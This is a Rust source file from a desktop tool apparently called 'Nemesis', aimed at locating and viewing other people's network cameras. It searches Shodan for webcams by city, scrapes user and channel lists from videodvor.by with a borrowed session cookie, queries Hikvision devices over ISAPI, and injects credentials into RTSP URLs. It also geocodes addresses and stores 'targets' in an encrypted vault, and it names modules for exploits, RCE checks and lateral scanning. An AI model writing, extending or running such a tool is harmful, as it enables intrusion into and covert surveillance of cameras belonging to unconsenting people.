#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use chrono::Utc;
use dotenv::dotenv;
use futures_util::{SinkExt, StreamExt};
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::{HashMap, HashSet};
use std::env;
use std::fs::OpenOptions;
use std::net::ToSocketAddrs;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, OnceLock};
pub mod api_fuzzer;
mod archive;
mod attack_graph;
mod asset_discovery;
mod archive_ai;
mod auditor;
mod breach_analyzer;
mod credential_auditor;
mod device_metadata;
mod compliance_checker;
pub mod broker;
pub mod exploit_searcher;
pub mod exploit_verifier;
mod ffmpeg;
mod feedback_store;
mod fuzzer;
mod knowledge;
mod lateral_scanner;
mod traffic_analyzer;
mod job_runner;
pub mod mass_auditor;
pub mod metadata_extractor;
mod nexus;
pub mod persistence_checker;
pub mod rce_verifier;
mod report_export;
pub mod session_checker;
pub mod spider;
mod streaming;
pub mod subnet_scanner;
mod system_cmds;
pub mod vuln_scanner;
mod vuln_verifier;
mod vuln_db_updater;
use suppaftp::FtpStream;
use tauri::State;
use tokio::sync::Mutex as TokioMutex;
use tokio::sync::Semaphore;
use tokio::{
    io::AsyncReadExt,
    process::{Child as TokioChild, ChildStdout as TokioChildStdout},
    task::JoinHandle,
    time::Duration,
};
use warp::Filter;

mod videodvor_scanner;

struct StreamState {
    active_streams: std::sync::Mutex<HashMap<String, ActiveStreamProcess>>,
}

struct ActiveStreamProcess {
    child: TokioChild,
    shutdown_ws: Option<tokio::sync::oneshot::Sender<()>>,
    ws_task: Option<JoinHandle<()>>,
    stdout_task: Option<JoinHandle<()>>,
}

struct VideodvorState {
    scanner: TokioMutex<videodvor_scanner::VideodvorScanner>,
}

pub struct LogState {
    lines: std::sync::Mutex<Vec<String>>,
}

struct DownloadCancelState {
    cancelled_tasks: std::sync::Mutex<HashSet<String>>,
}

struct FfmpegLimiterState {
    semaphore: Arc<Semaphore>,
}


// 🔥 СТЕЙТ ДЛЯ ПУЛЬТА ГИПЕРИОНА (nexus)
struct HyperionState {
    master_tx: TokioMutex<tokio::sync::mpsc::Sender<nexus::HyperionEvent>>,
}

// 🔥 МОСТ ЛОГОВ NEXUS -> UI
struct NexusLogBridge {
    lines: Arc<std::sync::Mutex<Vec<String>>>,
}

fn isapi_http_download_semaphore() -> Arc<Semaphore> {
    static SEM: OnceLock<Arc<Semaphore>> = OnceLock::new();
    SEM.get_or_init(|| Arc::new(Semaphore::new(1))).clone()
}

fn make_unique_task_key(base: Option<String>, prefix: &str) -> String {
    static SEQ: AtomicU64 = AtomicU64::new(1);
    let n = SEQ.fetch_add(1, Ordering::Relaxed);
    let raw = base.unwrap_or_else(|| format!("{}_{}", prefix, Utc::now().timestamp_millis()));
    format!("{}_{}", raw, n)
}

pub fn push_runtime_log(state: &State<'_, LogState>, message: impl Into<String>) {
    let ts = Utc::now().format("%H:%M:%S").to_string();
    let line = format!("[{}] {}", ts, message.into());
    if let Ok(mut logs) = state.lines.lock() {
        logs.push(line);
        if logs.len() > 500 {
            let keep_from = logs.len().saturating_sub(500);
            logs.drain(0..keep_from);
        }
    }
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct NvrDeviceInfoResult {
    endpoint: String,
    status: String,
    body_preview: String,
}

#[derive(Debug, Serialize)]
struct ProtocolProbeResult {
    protocol: String,
    endpoint: String,
    status: String,
}

#[derive(Debug, Serialize)]
struct RoadmapItem {
    name: String,
    status: String,
}

#[derive(Debug, Serialize)]
struct ImplementationStatus {
    total: usize,
    completed: usize,
    in_progress: usize,
    pending: usize,
    left: usize,
    items: Vec<RoadmapItem>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct IsapiRecordingItem {
    endpoint: String,
    track_id: Option<String>,
    start_time: Option<String>,
    end_time: Option<String>,
    playback_uri: Option<String>,
    transport: String,
    downloadable: bool,
    playable: bool,
    confidence: u8,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct IsapiHarTemplateResult {
    endpoint: String,
    method: String,
    content_type: Option<String>,
    request_body: String,
    search_id: Option<String>,
    track_id: Option<String>,
    start_time: Option<String>,
    end_time: Option<String>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct XmRecordingItem {
    start_time: String,
    end_time: String,
    playback_uri: String,
    label: String,
}

fn classify_isapi_record(
    playback_uri: Option<&str>,
    start_time: Option<&str>,
    end_time: Option<&str>,
) -> (String, bool, bool, u8) {
    let uri = playback_uri.unwrap_or_default().trim().to_lowercase();
    let has_window = start_time.is_some() && end_time.is_some();

    if uri.is_empty() {
        let confidence = if has_window { 30 } else { 5 };
        return ("none".into(), false, has_window, confidence);
    }

    let transport = if uri.starts_with("rtsp://") {
        "rtsp"
    } else if uri.starts_with("https://") {
        "https"
    } else if uri.starts_with("http://") {
        "http"
    } else {
        "unknown"
    };

    let downloadable = matches!(transport, "http" | "https")
        && (uri.contains("/download") || uri.contains("playbackuri=") || uri.contains("filename="));

    let playable = matches!(transport, "rtsp" | "http" | "https")
        || uri.contains("rtsp")
        || uri.contains("playback");

    let mut confidence = 20u8;
    if has_window {
        confidence = confidence.saturating_add(20);
    }
    if playable {
        confidence = confidence.saturating_add(25);
    }
    if downloadable {
        confidence = confidence.saturating_add(25);
    }
    if transport == "rtsp" || transport == "http" || transport == "https" {
        confidence = confidence.saturating_add(10);
    }

    (
        transport.into(),
        downloadable,
        playable,
        confidence.min(100),
    )
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct OnvifRecordingItem {
    endpoint: String,
    token: String,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ArchiveEndpointResult {
    protocol: String,
    endpoint: String,
    method: String,
    status: String,
    status_code: Option<u16>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ArchiveExportStage {
    stage: String,
    success: bool,
    reason: Option<String>,
    save_path: Option<String>,
    bytes_written: Option<u64>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ArchiveExportJobResult {
    task_id: String,
    final_status: String,
    selected_stage: String,
    retry_count: u8,
    stage_count: usize,
    fallback_duration_seconds: Option<u64>,
    final_reason: Option<String>,
    report: Option<DownloadReport>,
    stages: Vec<ArchiveExportStage>,
}

fn parse_archive_duration_from_uri(uri: &str) -> Option<u64> {
    fn parse_ts(input: &str) -> Option<chrono::DateTime<chrono::Utc>> {
        let cleaned = input.trim().replace("%3A", ":").replace("%2F", "/");
        let normalized = cleaned
            .replace(' ', "T")
            .trim_end_matches('Z')
            .replace('-', "")
            .replace(':', "");

        // 20260307T121314
        if normalized.len() == 15 && normalized.chars().nth(8) == Some('T') {
            chrono::NaiveDateTime::parse_from_str(&normalized, "%Y%m%dT%H%M%S")
                .ok()
                .map(|ndt| {
                    chrono::DateTime::<chrono::Utc>::from_naive_utc_and_offset(ndt, chrono::Utc)
                })
        } else {
            None
        }
    }

    let start_raw = uri.split("starttime=").nth(1)?.split('&').next()?.trim();
    let end_raw = uri.split("endtime=").nth(1)?.split('&').next()?.trim();

    let start = parse_ts(start_raw)?;
    let end = parse_ts(end_raw)?;
    let sec = (end - start).num_seconds();
    if sec <= 0 {
        return None;
    }

    // +15с буфер, но держим в разумных пределах
    Some((sec as u64).saturating_add(15).clamp(30, 1800))
}

fn clamp_isapi_item_window(
    start_time: Option<String>,
    end_time: Option<String>,
    from: &str,
    to: &str,
) -> (Option<String>, Option<String>, bool) {
    let parse = |v: &str| {
        chrono::DateTime::parse_from_rfc3339(v)
            .ok()
            .map(|d| d.with_timezone(&chrono::Utc))
    };
    let from_dt = match parse(from) {
        Some(v) => v,
        None => return (start_time, end_time, true),
    };
    let to_dt = match parse(to) {
        Some(v) => v,
        None => return (start_time, end_time, true),
    };

    let item_start = start_time.as_deref().and_then(parse);
    let item_end = end_time.as_deref().and_then(parse);

    match (item_start, item_end) {
        (Some(s), Some(e)) => {
            let overlap_start = if s > from_dt { s } else { from_dt };
            let overlap_end = if e < to_dt { e } else { to_dt };
            if overlap_end <= overlap_start {
                return (start_time, end_time, false);
            }
            (
                Some(overlap_start.to_rfc3339_opts(chrono::SecondsFormat::Secs, true)),
                Some(overlap_end.to_rfc3339_opts(chrono::SecondsFormat::Secs, true)),
                true,
            )
        }
        _ => (start_time, end_time, true),
    }
}

fn clamp_isapi_playback_uri_window(uri: &str, from: &str, to: &str) -> String {
    if !(uri.to_ascii_lowercase().starts_with("rtsp://")
        || uri.to_ascii_lowercase().starts_with("rtsps://"))
    {
        return uri.to_string();
    }

    let from_dt = chrono::DateTime::parse_from_rfc3339(from)
        .ok()
        .map(|d| d.with_timezone(&chrono::Utc));
    let to_dt = chrono::DateTime::parse_from_rfc3339(to)
        .ok()
        .map(|d| d.with_timezone(&chrono::Utc));

    let (from_dt, to_dt) = match (from_dt, to_dt) {
        (Some(f), Some(t)) if t > f => (f, t),
        _ => return uri.to_string(),
    };

    let from_compact = from_dt.format("%Y%m%dT%H%M%SZ").to_string();
    let to_compact = to_dt.format("%Y%m%dT%H%M%SZ").to_string();

    let mut out = uri.to_string();
    if out.contains("starttime=") {
        if let Some((head, tail)) = out.split_once("starttime=") {
            let mut rest = tail.to_string();
            if let Some(pos) = rest.find('&') {
                rest.replace_range(..pos, &from_compact);
            } else {
                rest = from_compact.clone();
            }
            out = format!("{}starttime={}", head, rest);
        }
    }

    if out.contains("endtime=") {
        if let Some((head, tail)) = out.split_once("endtime=") {
            let mut rest = tail.to_string();
            if let Some(pos) = rest.find('&') {
                rest.replace_range(..pos, &to_compact);
            } else {
                rest = to_compact.clone();
            }
            out = format!("{}endtime={}", head, rest);
        }
    }

    out
}

pub fn normalize_host_for_scan(input: &str) -> String {
    input
        .trim()
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .trim_start_matches("rtsp://")
        .split('/')
        .next()
        .unwrap_or_default()
        .split(':')
        .next()
        .unwrap_or_default()
        .to_string()
}

pub fn get_vault_path() -> PathBuf {
    // В Linux нет диска D:\, используем домашнюю директорию пользователя kali
    let path = PathBuf::from("/home/kali/Nemesis_Vault");
    if !path.exists() {
        let _ = std::fs::create_dir_all(&path);
    }
    path
}

pub fn get_ffmpeg_path() -> PathBuf {
    let bundled = get_vault_path().join(if cfg!(target_os = "windows") {
        "ffmpeg.exe"
    } else {
        "ffmpeg"
    });

    if bundled.exists() {
        bundled
    } else if cfg!(target_os = "windows") {
        PathBuf::from("ffmpeg.exe")
    } else {
        PathBuf::from("ffmpeg")
    }
}

fn derive_hardware_key() -> [u8; 32] {
    let hw_id = machine_uid::get().unwrap_or_else(|_| "NEMESIS_ID".to_string());
    let mut hasher = Sha256::new();
    hasher.update(hw_id.as_bytes());
    let mut key = [0u8; 32];
    key.copy_from_slice(&hasher.finalize());
    key
}

// --- БАЗА ДАННЫХ ПАУКА ---
#[derive(Debug, serde::Serialize, serde::Deserialize)]
struct DeviceRecord {
    id: String,
    ip: String,
    vendor: String,
    status: String,
    first_seen: i64,
    last_seen: i64,
}

async fn save_device_to_db(
    device_id: &str,
    ip: &str,
    vendor: &str,
    status: &str,
) -> Result<(), String> {
    let db = sled::open(get_vault_path().join("devices_db")).map_err(|e| e.to_string())?;
    let key = format!("device:{}", device_id);
    let now = Utc::now().timestamp();
    let record = DeviceRecord {
        id: device_id.to_string(),
        ip: ip.to_string(),
        vendor: vendor.to_string(),
        status: status.to_string(),
        first_seen: now,
        last_seen: now,
    };
    let value = serde_json::to_vec(&record).map_err(|e| e.to_string())?;
    db.insert(key.as_bytes(), value)
        .map_err(|e| e.to_string())?;
    Ok(())
}

// --- ИНТЕГРАЦИЯ SHODAN ---
// --- ИНТЕГРАЦИЯ SHODAN ---
#[tauri::command]
async fn external_search(
    country: String,
    city: String,
    log_state: State<'_, LogState>,
) -> Result<Vec<Value>, String> {
    let api_key = env::var("SHODAN_API_KEY").unwrap_or_default();
    if api_key.is_empty() {
        return Err("API ключ Shodan не найден в .env".into());
    }

    let client = reqwest::Client::new();
    let query = format!("webcam port:80,554 country:{} city:{}", country, city);

    push_runtime_log(&log_state, format!("Поиск Shodan: {}", query));

    let url = format!(
        "https://api.shodan.io/shodan/host/search?key={}&query={}",
        api_key,
        urlencoding::encode(&query)
    );

    let res: Value = client
        .get(&url)
        .send()
        .await
        .map_err(|e| e.to_string())?
        .json()
        .await
        .map_err(|e| e.to_string())?;
    let mut results = Vec::new();

    if let Some(matches) = res["matches"].as_array() {
        for m in matches {
            let ip = m["ip_str"].as_str().unwrap_or("").to_string();
            let port = m["port"].as_u64().unwrap_or(0);
            let dev_id = format!("shodan_{}", ip.replace(".", "_"));

            let _ = save_device_to_db(&dev_id, &ip, "Unknown", "Found").await;

            results.push(serde_json::json!({
                "id": dev_id,
                "ip": format!("{}:{}", ip, port),
                "status": "Добавлено в Базу"
            }));
        }
    }
    Ok(results)
}

// --- НОВЫЙ МОДУЛЬ: FFMPEG ТУННЕЛЬ ДЛЯ ХАБА ---
struct WsRelayHandles {
    ws_url: String,
    shutdown_tx: tokio::sync::oneshot::Sender<()>,
    ws_task: JoinHandle<()>,
    stdout_task: JoinHandle<()>,
}

async fn spawn_ws_relay(
    target_id: String,
    mut stdout: TokioChildStdout,
) -> Result<WsRelayHandles, String> {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .map_err(|e| e.to_string())?;
    let port = listener.local_addr().map_err(|e| e.to_string())?.port();

    let (tx, _) = tokio::sync::broadcast::channel::<Vec<u8>>(64);
    let (shutdown_tx, mut shutdown_rx) = tokio::sync::oneshot::channel::<()>();

    let tx_stdout = tx.clone();
    let stdout_task = tokio::spawn(async move {
        let mut buffer = vec![0u8; 8192];
        loop {
            match stdout.read(&mut buffer).await {
                Ok(0) => break,
                Ok(n) => {
                    let _ = tx_stdout.send(buffer[..n].to_vec());
                }
                Err(_) => break,
            }
        }
    });

    let ws_task = tokio::spawn(async move {
        loop {
            tokio::select! {
                _ = &mut shutdown_rx => break,
                incoming = listener.accept() => {
                    let Ok((stream, _)) = incoming else { continue; };
                    let mut rx = tx.subscribe();
                    tokio::spawn(async move {
                        let Ok(ws) = tokio_tungstenite::accept_async(stream).await else { return; };
                        let (mut sink, _) = ws.split();
                        while let Ok(chunk) = rx.recv().await {
                            if sink.send(tokio_tungstenite::tungstenite::Message::Binary(chunk.into())).await.is_err() {
                                break;
                            }
                        }
                    });
                }
            }
        }
    });

    let ws_url = format!("ws://127.0.0.1:{}", port);
    println!("WS relay ready for stream {}: {}", target_id, ws_url);

    Ok(WsRelayHandles {
        ws_url,
        shutdown_tx,
        ws_task,
        stdout_task,
    })
}

fn terminate_stream_process(mut stream: ActiveStreamProcess) {
    if let Some(shutdown) = stream.shutdown_ws.take() {
        let _ = shutdown.send(());
    }
    if let Some(ws_task) = stream.ws_task.take() {
        ws_task.abort();
    }
    if let Some(stdout_task) = stream.stdout_task.take() {
        stdout_task.abort();
    }
    let _ = stream.child.start_kill();
}

pub async fn start_hub_stream(
    target_id: String,
    user_id: String,
    channel_id: String,
    cookie: String,
    state: State<'_, StreamState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    push_runtime_log(
        &log_state,
        format!(
            "Start hub stream: {} (user={}, ch={})",
            target_id, user_id, channel_id
        ),
    );
    {
        let mut streams = state.active_streams.lock().unwrap();
        if let Some(old) = streams.remove(&target_id) {
            terminate_stream_process(old);
        }
    }

    let url = format!(
        "https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}",
        user_id, channel_id
    );

    let mut child = tokio::process::Command::new("ffmpeg")
        .args({
            let headers = format!(
                "Cookie: {}\r\nReferer: https://videodvor.by/stream/admin.php\r\n",
                cookie
            );
            crate::ffmpeg::FfmpegProfiles::web_stream(&url, Some(&headers))
        })
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| format!("FFmpeg start error: {}", e))?;

    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| "FFmpeg stdout not captured".to_string())?;
    let relay = spawn_ws_relay(target_id.clone(), stdout).await?;

    state.active_streams.lock().unwrap().insert(
        target_id.clone(),
        ActiveStreamProcess {
            child,
            shutdown_ws: Some(relay.shutdown_tx),
            ws_task: Some(relay.ws_task),
            stdout_task: Some(relay.stdout_task),
        },
    );
    Ok(relay.ws_url)
}

// --- ИСПРАВЛЕННЫЙ СКАНЕР: НАХОДИТ ВСЕ КАНАЛЫ (КАМЕРЫ) ---
#[tauri::command]
async fn search_global_hub(query: String, cookie: String) -> Result<Vec<Value>, String> {
    let client = reqwest::Client::new();
    let encoded_query = urlencoding::encode(&query);
    let url = format!(
        "https://videodvor.by/stream/check.php?search={}",
        encoded_query
    );

    let res = client
        .get(&url)
        .header("Cookie", cookie)
        .send()
        .await
        .map_err(|e| e.to_string())?
        .text()
        .await
        .map_err(|e| e.to_string())?;

    let mut results = Vec::new();
    let blocks: Vec<&str> = res.split("<div class=\"name-blok\">").collect();

    let re_user = Regex::new(r#"<b>USER\s*(\d+)</b>\s*\((.*?)\)</div>"#).unwrap();
    let re_channels = Regex::new(r#"id=(\d+)""#).unwrap();

    for block in blocks.iter().skip(1) {
        if let Some(caps) = re_user.captures(block) {
            let user_id = caps[1].to_string();
            let address = caps[2].to_string();

            let mut channels = Vec::new();
            for ch_caps in re_channels.captures_iter(block) {
                channels.push(ch_caps[1].to_string());
            }
            if channels.is_empty() {
                channels.push("0".to_string());
            }

            results.push(serde_json::json!({
                "id": user_id,
                "ip": address,
                "channels": channels
            }));
        }
    }
    Ok(results)
}

fn start_background_scheduler() {
    std::thread::spawn(|| {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            loop {
                tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
            }
        });
    });
}

#[tauri::command]
fn save_target(target_id: String, payload: String) -> Result<String, String> {
    let db = sled::open(get_vault_path().join("targets_vault"))
        .map_err(|e: sled::Error| e.to_string())?;
    let cipher = Aes256Gcm::new(&derive_hardware_key().into());
    let encrypted_data = cipher
        .encrypt(Nonce::from_slice(b"nemesis_salt"), payload.as_bytes())
        .map_err(|_| "Encryption error".to_string())?;
    db.insert(target_id.as_bytes(), encrypted_data)
        .map_err(|e: sled::Error| e.to_string())?;
    Ok("Saved".into())
}

#[tauri::command]
fn read_target(target_id: String) -> Result<String, String> {
    let db = sled::open(get_vault_path().join("targets_vault"))
        .map_err(|e: sled::Error| e.to_string())?;
    if let Some(data) = db
        .get(target_id.as_bytes())
        .map_err(|e: sled::Error| e.to_string())?
    {
        let cipher = Aes256Gcm::new(&derive_hardware_key().into());
        let decrypted = cipher
            .decrypt(Nonce::from_slice(b"nemesis_salt"), data.as_ref())
            .map_err(|_| "Access denied".to_string())?;
        String::from_utf8(decrypted).map_err(|_| "UTF-8 error".to_string())
    } else {
        Err("Not found".to_string())
    }
}

#[tauri::command]
fn get_all_targets() -> Result<Vec<String>, String> {
    let db = sled::open(get_vault_path().join("targets_vault"))
        .map_err(|e: sled::Error| e.to_string())?;
    let mut keys = Vec::new();
    for k in db.iter().keys() {
        if let Ok(key_bytes) = k {
            if let Ok(s) = String::from_utf8(key_bytes.to_vec()) {
                keys.push(s);
            }
        }
    }
    Ok(keys)
}

#[tauri::command]
fn delete_target(target_id: String) -> Result<String, String> {
    let db = sled::open(get_vault_path().join("targets_vault"))
        .map_err(|e: sled::Error| e.to_string())?;
    db.remove(target_id.as_bytes())
        .map_err(|e: sled::Error| e.to_string())?;
    Ok("Deleted".into())
}

#[tauri::command]
async fn geocode_address(address: String) -> Result<(f64, f64), String> {
    let encoded = urlencoding::encode(&address);
    let url = format!(
        "https://nominatim.openstreetmap.org/search?q={}&format=json&limit=1",
        encoded
    );
    let client = reqwest::Client::builder()
        .user_agent("Nemesis")
        .build()
        .unwrap();
    let res = client.get(&url).send().await.map_err(|e| e.to_string())?;
    let data: Vec<Value> = res.json().await.map_err(|e| e.to_string())?;
    if data.is_empty() {
        return Err("Empty".into());
    }
    let lat = data[0]["lat"].as_str().unwrap().parse::<f64>().unwrap();
    let lon = data[0]["lon"].as_str().unwrap().parse::<f64>().unwrap();
    Ok((lat, lon))
}

#[tauri::command]
fn generate_nvr_channels(_vendor: String, channel_count: u32) -> Result<Vec<Value>, String> {
    let mut channels = Vec::new();
    for i in 1..=channel_count {
        channels.push(serde_json::json!({ "id": format!("ch{}", i), "index": i, "name": format!("Cam {}", i) }));
    }
    Ok(channels)
}

/// Очистка старых HLS-файлов перед запуском нового стрима

fn read_last_log_lines(path: &std::path::Path, lines: usize) -> String {
    let Ok(content) = std::fs::read_to_string(path) else {
        return String::new();
    };
    content
        .lines()
        .rev()
        .take(lines)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect::<Vec<_>>()
        .join(" | ")
}

fn cleanup_hls_cache(cache_dir: &std::path::Path) {
    if cache_dir.exists() {
        if let Ok(entries) = std::fs::read_dir(cache_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                    if ext == "m3u8" || ext == "ts" {
                        let _ = std::fs::remove_file(&path);
                    }
                }
            }
        }
    }
}

async fn fetch_hikvision_active_channels(
    host: &str,
    isapi_port: u16,
    login: &str,
    pass: &str,
) -> Result<Vec<u32>, String> {
    let endpoint = format!(
        "http://{}:{}/ISAPI/System/Video/inputs/channels",
        host, isapi_port
    );
    let request_path = "/ISAPI/System/Video/inputs/channels";

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(4))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut response = client
        .get(&endpoint)
        .header("Accept", "application/xml")
        .send()
        .await
        .map_err(|e| format!("ISAPI preflight request failed: {}", e))?;

    if response.status().as_u16() == 401 {
        if let Some(www_auth) = response
            .headers()
            .get("WWW-Authenticate")
            .and_then(|h| h.to_str().ok())
        {
            if let Ok(mut prompt) = digest_auth::parse(www_auth) {
                let mut ctx = digest_auth::AuthContext::new(
                    login.to_string(),
                    pass.to_string(),
                    request_path.to_string(),
                );
                ctx.method = digest_auth::HttpMethod::GET;
                if let Ok(answer) = prompt.respond(&ctx) {
                    response = client
                        .get(&endpoint)
                        .header("Accept", "application/xml")
                        .header("Authorization", answer.to_string())
                        .send()
                        .await
                        .map_err(|e| format!("ISAPI digest preflight failed: {}", e))?;
                }
            }
        }
    }

    if !response.status().is_success() {
        return Err(format!(
            "ISAPI preflight HTTP status {}",
            response.status().as_u16()
        ));
    }

    let body = response
        .text()
        .await
        .map_err(|e| format!("ISAPI preflight body read failed: {}", e))?;

    let channel_re = Regex::new(r"(?is)<VideoInputChannel[^>]*>(.*?)</VideoInputChannel>")
        .map_err(|e| e.to_string())?;
    let id_re = Regex::new(r"(?is)<id>\s*(\d+)\s*</id>").map_err(|e| e.to_string())?;
    let enabled_re = Regex::new(r"(?is)<videoInputEnabled>\s*true\s*</videoInputEnabled>")
        .map_err(|e| e.to_string())?;
    let no_video_re =
        Regex::new(r"(?is)<resDesc>\s*NO\s+VIDEO\s*</resDesc>").map_err(|e| e.to_string())?;

    let mut active = Vec::new();
    for caps in channel_re.captures_iter(&body) {
        let block = caps.get(1).map(|m| m.as_str()).unwrap_or_default();
        if !enabled_re.is_match(block) || no_video_re.is_match(block) {
            continue;
        }
        if let Some(id_caps) = id_re.captures(block) {
            if let Ok(id) = id_caps
                .get(1)
                .map(|m| m.as_str())
                .unwrap_or_default()
                .parse::<u32>()
            {
                active.push(id);
            }
        }
    }

    active.sort_unstable();
    active.dedup();
    Ok(active)
}

pub async fn start_stream(
    target_id: String,
    rtsp_url: String,
    state: State<'_, StreamState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    push_runtime_log(&log_state, format!("Start stream: {}", target_id));

    {
        let mut streams = state.active_streams.lock().unwrap();
        if let Some(old) = streams.remove(&target_id) {
            terminate_stream_process(old);
        }
    }

    let mut child = tokio::process::Command::new("ffmpeg")
        .args(crate::ffmpeg::FfmpegProfiles::web_stream(&rtsp_url, None))
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| format!("FFmpeg start error: {}", e))?;

    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| "FFmpeg stdout not captured".to_string())?;
    let relay = spawn_ws_relay(target_id.clone(), stdout).await?;

    state.active_streams.lock().unwrap().insert(
        target_id,
        ActiveStreamProcess {
            child,
            shutdown_ws: Some(relay.shutdown_tx),
            ws_task: Some(relay.ws_task),
            stdout_task: Some(relay.stdout_task),
        },
    );

    Ok(relay.ws_url)
}

fn check_stream_alive(target_id: String, state: State<'_, StreamState>) -> Result<bool, String> {
    let mut streams = state.active_streams.lock().unwrap();
    if let Some(stream) = streams.get_mut(&target_id) {
        match stream.child.try_wait() {
            Ok(Some(_)) => {
                if let Some(old) = streams.remove(&target_id) {
                    terminate_stream_process(old);
                }
                Ok(false)
            }
            Ok(None) => Ok(true),
            Err(_) => Ok(false),
        }
    } else {
        Ok(false)
    }
}

/// Перезапуск стрима: kill -> cleanup -> start заново
pub async fn restart_stream(
    target_id: String,
    rtsp_url: String,
    state: State<'_, StreamState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    push_runtime_log(&log_state, format!("Restart stream: {}", target_id));

    {
        let mut streams = state.active_streams.lock().unwrap();
        if let Some(old) = streams.remove(&target_id) {
            terminate_stream_process(old);
        }
    }

    start_stream(target_id, rtsp_url, state, log_state).await
}

fn stop_stream(
    target_id: String,
    state: State<'_, StreamState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    if let Some(stream) = state.active_streams.lock().unwrap().remove(&target_id) {
        terminate_stream_process(stream);
        push_runtime_log(&log_state, format!("Stop stream: {}", target_id));
        Ok("Stopped".into())
    } else {
        Ok("Inactive".into())
    }
}

// --- НОВЫЙ БЛОК FTP-НАВИГАТОРА ---

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct FtpFolder {
    pub name: String,
    pub path: String,
    pub is_file: bool,
}

struct FtpConfig {
    host: &'static str,
    user: &'static str,
    pass: &'static str,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct DownloadReport {
    server_alias: String,
    filename: String,
    save_path: String,
    bytes_written: u64,
    total_bytes: u64,
    duration_ms: u128,
    resumed: bool,
    skipped_as_complete: bool,
}

pub fn sanitize_filename_component(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for ch in input.chars() {
        if ch.is_ascii_alphanumeric() || ch == '.' || ch == '_' || ch == '-' {
            out.push(ch);
        } else {
            out.push('_');
        }
    }
    let trimmed = out.trim_matches('_');
    if trimmed.is_empty() {
        "recording".into()
    } else {
        trimmed.to_string()
    }
}

/// Инжектит login:pass в RTSP URI если кредентиалы ещё не встроены.
/// rtsp://host:554/path → rtsp://login:pass@host:554/path
/// rtsp://admin:old@host/path → rtsp://login:pass@host/path (заменяет)
fn inject_rtsp_credentials(uri: &str, login: &str, pass: &str) -> String {
    if login.is_empty() {
        return uri.to_string();
    }

    // Находим схему
    let (scheme, rest) = if let Some(idx) = uri.find("://") {
        (&uri[..idx + 3], &uri[idx + 3..])
    } else {
        return uri.to_string();
    };

    // Убираем существующие кредентиалы если есть (user:pass@)
    let host_and_path = if let Some(at_idx) = rest.find('@') {
        // Проверяем что @ до первого / (т.е. это часть auth, а не path)
        let slash_idx = rest.find('/').unwrap_or(rest.len());
        if at_idx < slash_idx {
            &rest[at_idx + 1..]
        } else {
            rest
        }
    } else {
        rest
    };

    // URL-encode пароль (на случай спецсимволов)
    let encoded_pass = pass.replace('@', "%40").replace(':', "%3A");

    format!("{}{}:{}@{}", scheme, login, encoded_pass, host_and_path)
}

/// Строит HTTP(S) endpoint выгрузки архива из RTSP playbackURI:
///   rtsp://host:2019/... -> http://host:2019/ISAPI/ContentMgmt/download?playbackURI=...
fn parse_host_port_hint(input: &str) -> Option<(String, Option<u16>)> {
    let trimmed = input.trim();
    if trimmed.is_empty() {
        return None;
    }

    let normalized = if trimmed.contains("://") {
        trimmed.to_string()
    } else {
        format!("http://{}", trimmed)
    };

    let parsed = reqwest::Url::parse(&normalized).ok()?;
    let host = parsed.host_str()?.to_string();
    Some((host, parsed.port()))
}

fn extract_host_hint_from_filename_hint(filename_hint: Option<&str>) -> Option<String> {
    let hint = filename_hint?.trim();
    if hint.is_empty() {
        return None;
    }
    let re = Regex::new(r"(?i)(\d{1,3})_(\d{1,3})_(\d{1,3})_(\d{1,3})_cam").ok()?;
    let caps = re.captures(hint)?;
    let octets = [caps.get(1)?, caps.get(2)?, caps.get(3)?, caps.get(4)?];
    let mut parts: Vec<String> = Vec::with_capacity(4);
    for m in octets {
        let v: u16 = m.as_str().parse().ok()?;
        if v > 255 {
            return None;
        }
        parts.push(v.to_string());
    }
    Some(parts.join("."))
}

fn build_isapi_download_endpoints_from_rtsp(
    playback_uri: &str,
    source_host_hint: Option<&str>,
) -> Vec<String> {
    let parsed = match reqwest::Url::parse(playback_uri) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };
    let rtsp_host = match parsed.host_str() {
        Some(v) => v,
        None => return Vec::new(),
    };
    let rtsp_port = parsed
        .port_or_known_default()
        .unwrap_or(if parsed.scheme() == "rtsps" { 322 } else { 554 });

    let mut host_candidates: Vec<(String, Option<u16>)> = Vec::new();
    if let Some(hint) = source_host_hint.and_then(parse_host_port_hint) {
        host_candidates.push(hint);
    }
